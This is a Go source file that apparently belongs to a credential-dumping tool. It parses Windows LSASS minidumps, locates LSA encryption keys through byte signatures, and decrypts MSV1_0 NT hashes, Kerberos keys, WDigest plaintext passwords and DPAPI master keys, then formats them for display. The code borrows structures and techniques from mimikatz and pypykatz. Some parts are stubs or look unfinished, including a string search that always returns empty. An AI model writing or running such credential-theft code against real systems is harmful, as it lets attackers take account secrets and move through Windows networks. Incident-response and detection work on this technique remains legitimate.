package minidump

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
)

// LSA Decryption key patterns for finding crypto keys in memory
var (
	// Patterns to locate crypto keys in lsasrv.dll memory
	// These are used to find AES/3DES keys and IVs
	lsaSignatureWin10 = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}
	lsaSignatureWin81 = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}
	lsaSignatureWin8  = []byte{0x8b, 0xf0, 0x85, 0xc0, 0x0f, 0x84}
	lsaSignatureWin7  = []byte{0x8b, 0xf0, 0x85, 0xc0, 0x0f, 0x84}

	// MSV credential list pattern - used to find LogonSessionList
	msvCredListPattern = []byte{0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb}
)

// CryptoKeys holds the LSA encryption keys
type CryptoKeys struct {
	IV     []byte // 16 bytes
	AESKey []byte // 16 or 32 bytes
	DESKey []byte // 24 bytes (3DES)
	Found  bool
}

// ExtractCredentials extracts credentials from the parsed minidump
// This extracts LSA keys and decrypts MSV1_0 credentials
func (d *Dump) ExtractCredentials() error {
	if len(d.Memory) == 0 {
		return fmt.Errorf("no memory data available")
	}

	// Find modules we need
	lsasrv := d.FindModule("lsasrv.dll")
	if lsasrv == nil {
		return fmt.Errorf("lsasrv.dll not found in module list")
	}

	msv := d.FindModule("msv1_0.dll")
	if msv == nil {
		return fmt.Errorf("msv1_0.dll not found in module list")
	}

	// First, find LSA encryption keys
	keys, err := d.FindLSAKeys()
	if err != nil {
		return fmt.Errorf("failed to find LSA keys: %w", err)
	}

	// Extract MSV1_0 credentials (NT hashes)
	msvCreds, err := d.FindMSVCredentials(keys)
	if err != nil {
		// Non-fatal, continue with other packages
	}
	if len(msvCreds) > 0 {
		d.Credentials = append(d.Credentials, msvCreds...)
	}

	// Extract Kerberos credentials (AES keys)
	kerbCreds, err := d.FindKerberosCredentials(keys)
	if err != nil {
		// Non-fatal, continue
	}
	if len(kerbCreds) > 0 {
		d.KerberosCredentials = kerbCreds
	}

	// Extract WDIGEST credentials (plaintext passwords)
	wdigestCreds, err := d.FindWdigestCredentials(keys)
	if err != nil {
		// Non-fatal, continue
	}
	if len(wdigestCreds) > 0 {
		d.WdigestCredentials = wdigestCreds
	}

	// Extract DPAPI master keys
	dpapiKeys, err := d.FindDPAPICredentials(keys)
	if err != nil {
		// Non-fatal, continue
	}
	if len(dpapiKeys) > 0 {
		d.DPAPIMasterKeys = dpapiKeys
	}

	// Also try pattern-based heuristic search as fallback
	patternCreds := d.findCredentialsByPattern()
	if len(patternCreds) > 0 {
		d.Credentials = append(d.Credentials, patternCreds...)
	}

	return nil
}

// findCredentialsByPattern looks for credential structures using known patterns
func (d *Dump) findCredentialsByPattern() []Credential {
	var creds []Credential

	// Search for MSV1_0_PRIMARY_CREDENTIAL structures
	// These have a characteristic layout with username/domain pointers followed by hashes

	// We'll look for patterns that indicate a credential structure:
	// 1. Valid NT hash (16 bytes, not all zeros, not obviously garbage)
	// 2. Preceded by what looks like string length fields

	mem := d.Memory

	// Known empty NT hash for blank password
	emptyNT := []byte{0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0}

	// Search for credential structures by looking for the pattern of:
	// [username_len:2][max_len:2][buffer_ptr:8][domain_len:2][max_len:2][buffer_ptr:8][LM_hash:16][NT_hash:16]
	// This is approximately how MSV1_0 stores credentials

	// Step through memory looking for valid hash patterns
	for i := 72; i < len(mem)-32; i += 8 {
		if i+32 > len(mem) {
			break
		}

		ntHash := mem[i : i+16]

		// Skip if not a valid-looking hash
		if !isValidHash(ntHash) {
			continue
		}

		// Check for LM hash right before (optional, might be empty)
		lmHash := mem[i-16 : i]
		if !isValidHash(lmHash) && !bytes.Equal(lmHash, make([]byte, 16)) {
			continue
		}

		// Look for UNICODE_STRING structures before the hashes
		// Each has [Length:2][MaxLength:2][Padding:4][Pointer:8] = 16 bytes for 64-bit

		// Try to find username and domain strings
		username, domain := d.findCredentialStrings(mem, i-16-32)

		if username == "" {
			// Try another offset
			username, domain = d.findCredentialStrings(mem, i-16-64)
		}

		// Only add if we have a username that looks valid
		if username != "" && isValidUsername(username) {
			// Check if we already have this credential
			isDupe := false
			for _, existing := range creds {
				if existing.Username == username && existing.NTHash == hex.EncodeToString(ntHash) {
					isDupe = true
					break
				}
			}

			if !isDupe {
				cred := Credential{
					Username: username,
					Domain:   domain,
					NTHash:   hex.EncodeToString(ntHash),
					CredType: "MSV1_0",
				}

				// Check if LM hash is not empty
				if !bytes.Equal(lmHash, make([]byte, 16)) && isValidHash(lmHash) {
					cred.LMHash = hex.EncodeToString(lmHash)
				}

				// Check for empty password hash
				if bytes.Equal(ntHash, emptyNT) {
					cred.Password = "(empty password)"
				}

				creds = append(creds, cred)
			}
		}
	}

	return creds
}

// findCredentialStrings tries to extract username/domain from near a hash location
func (d *Dump) findCredentialStrings(mem []byte, offset int) (username, domain string) {
	if offset < 0 || offset+32 > len(mem) {
		return "", ""
	}

	// Try to read UNICODE_STRING structures
	// Format: [Length:2][MaxLength:2][Padding:4][Pointer:8]

	// Read potential domain string info
	if offset >= 16 {
		domLen := binary.LittleEndian.Uint16(mem[offset:])
		if domLen > 0 && domLen < 256 && domLen%2 == 0 {
			// Try to find the actual string data
			domain = d.searchForString(mem, int(domLen))
		}
	}

	// Read potential username string info
	if offset+16 < len(mem) {
		usrLen := binary.LittleEndian.Uint16(mem[offset+16:])
		if usrLen > 0 && usrLen < 256 && usrLen%2 == 0 {
			username = d.searchForString(mem, int(usrLen))
		}
	}

	return username, domain
}

// searchForString attempts to find a valid username in nearby memory
func (d *Dump) searchForString(mem []byte, targetLen int) string {
	// This is simplified - a proper implementation would follow pointers
	// For now we return empty and rely on the simpler extraction method
	return ""
}

// isValidHash checks if a 16-byte block looks like a valid hash
func isValidHash(data []byte) bool {
	if len(data) != 16 {
		return false
	}

	// All zeros = not a hash
	allZero := true
	for _, b := range data {
		if b != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		return false
	}

	// All same byte = probably not a hash
	allSame := true
	for _, b := range data[1:] {
		if b != data[0] {
			allSame = false
			break
		}
	}
	if allSame {
		return false
	}

	// Check entropy - at least 6 unique bytes
	unique := make(map[byte]bool)
	for _, b := range data {
		unique[b] = true
	}

	return len(unique) >= 6
}

// isValidUsername checks if a string looks like a valid username
func isValidUsername(s string) bool {
	if len(s) < 2 || len(s) > 64 {
		return false
	}

	// Filter out obvious garbage
	lower := strings.ToLower(s)
	garbage := []string{
		"windows", "system32", "syswow64", "program", "microsoft",
		"c:\\", "\\windows", ".dll", ".exe", "http", "ldap",
		"cn=", "dc=", "ou=", "ssl:", "page", "order", "false", "true",
		"schema", "config", "local",
	}

	for _, g := range garbage {
		if strings.Contains(lower, g) {
			return false
		}
	}

	// Should not contain most special chars
	invalidChars := []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*", "=", ";", ","}
	for _, c := range invalidChars {
		if strings.Contains(s, c) {
			return false
		}
	}

	return true
}

// DecryptCredential attempts to decrypt an encrypted credential
func DecryptCredential(encData, key, iv []byte, useAES bool) ([]byte, error) {
	if useAES {
		return decryptAES(encData, key, iv)
	}
	return decrypt3DES(encData, key, iv)
}

func decryptAES(data, key, iv []byte) ([]byte, error) {
	if len(key) != 16 && len(key) != 32 {
		return nil, fmt.Errorf("invalid AES key length: %d", len(key))
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(iv) < aes.BlockSize {
		return nil, fmt.Errorf("IV too short")
	}

	// Implement CFB-128 mode (segment_size=128) like pypykatz
	// Go's cipher.NewCFBDecrypter uses CFB-8 (1-byte segments), but
	// Windows LSA uses CFB-128 (16-byte segments)
	//
	// CFB-128 algorithm:
	// 1. Start with IV as the "register"
	// 2. Encrypt the register with AES to get keystream block
	// 3. XOR keystream with ciphertext block to get plaintext
	// 4. Use the ciphertext block as the new register
	// 5. Repeat for each 16-byte block

	result := make([]byte, len(data))
	register := make([]byte, aes.BlockSize)
	copy(register, iv[:aes.BlockSize])
	keystream := make([]byte, aes.BlockSize)

	for i := 0; i < len(data); i += aes.BlockSize {
		// Encrypt the register to get keystream
		block.Encrypt(keystream, register)

		// Determine how many bytes to process (handle partial final block)
		remaining := len(data) - i
		blockLen := aes.BlockSize
		if remaining < blockLen {
			blockLen = remaining
		}

		// XOR ciphertext with keystream to get plaintext
		for j := 0; j < blockLen; j++ {
			result[i+j] = data[i+j] ^ keystream[j]
		}

		// Use ciphertext block as new register for next iteration
		if blockLen == aes.BlockSize {
			copy(register, data[i:i+aes.BlockSize])
		} else {
			// Partial block: shift register left and append ciphertext bytes
			copy(register, register[blockLen:])
			copy(register[aes.BlockSize-blockLen:], data[i:i+blockLen])
		}
	}

	return result, nil
}

func decrypt3DES(data, key, iv []byte) ([]byte, error) {
	if len(key) != 24 {
		return nil, fmt.Errorf("invalid 3DES key length: %d", len(key))
	}

	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	if len(iv) < des.BlockSize {
		return nil, fmt.Errorf("IV too short")
	}

	mode := cipher.NewCBCDecrypter(block, iv[:des.BlockSize])

	result := make([]byte, len(data))
	mode.CryptBlocks(result, data)

	return result, nil
}

// FormatCredential formats a credential for display
func FormatCredential(c Credential) string {
	var parts []string

	if c.Domain != "" {
		parts = append(parts, fmt.Sprintf("Domain: %s", c.Domain))
	}
	if c.Username != "" {
		parts = append(parts, fmt.Sprintf("User: %s", c.Username))
	}
	if c.NTHash != "" {
		parts = append(parts, fmt.Sprintf("NT: %s", c.NTHash))
	}
	if c.SHA1Hash != "" {
		parts = append(parts, fmt.Sprintf("SHA1: %s", c.SHA1Hash))
	}
	if c.LMHash != "" && c.LMHash != "aad3b435b51404eeaad3b435b51404ee" {
		parts = append(parts, fmt.Sprintf("LM: %s", c.LMHash))
	}
	if c.Password != "" {
		parts = append(parts, fmt.Sprintf("Pass: %s", c.Password))
	}

	return strings.Join(parts, " | ")
}

// KIWI_MSV1_0_CREDENTIALS structure (simplified)
type KIWI_MSV1_0_CREDENTIALS struct {
	AuthenticationId uint64
	Credentials      MSV_CREDENTIALS
}

// MSV_CREDENTIALS structure
type MSV_CREDENTIALS struct {
	UserName string
	Domain   string
	LmHash   [16]byte
	NtHash   [16]byte
}

// parseListEntry parses a Windows LIST_ENTRY structure
func parseListEntry(data []byte, offset int) (flink, blink uint64) {
	if offset+16 > len(data) {
		return 0, 0
	}
	flink = binary.LittleEndian.Uint64(data[offset:])
	blink = binary.LittleEndian.Uint64(data[offset+8:])
	return
}
